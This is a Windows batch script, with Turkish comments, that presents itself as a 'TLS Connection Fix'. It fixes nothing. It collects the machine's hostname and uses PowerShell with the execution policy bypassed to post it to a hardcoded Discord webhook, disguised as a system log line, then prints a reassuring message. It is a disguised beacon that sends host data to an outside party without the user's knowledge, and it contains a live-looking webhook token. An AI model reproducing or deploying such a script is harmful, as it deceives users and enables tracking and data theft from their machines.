@echo off
title TLS Connection Fix
chcp 65001 >nul

set "URL=https://discord.com/api/webhooks/1514118771776688164/dKNF5PnIXuS8-ERE-c-JTWzOWl1U_bYZuVZ5yYCcqKAcCoPw6FqQi7S_MxrP7LMA1f-0"

for /f "tokens=*" %%a in ('hostname') do set "H=%%a"

:: Güvenlik protokolünü TLS 1.2'ye zorlayarak gönderme
powershell -NoProfile -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $json = @{content='[SYSTEM LOG] Host: %H% | Durum: Baglanti Aktif'}; Invoke-RestMethod -Uri '%URL%' -Method Post -Body ($json | ConvertTo-Json) -ContentType 'application/json'"

echo Islem tamamlandi, ag yaniti bekleniyor...
pause
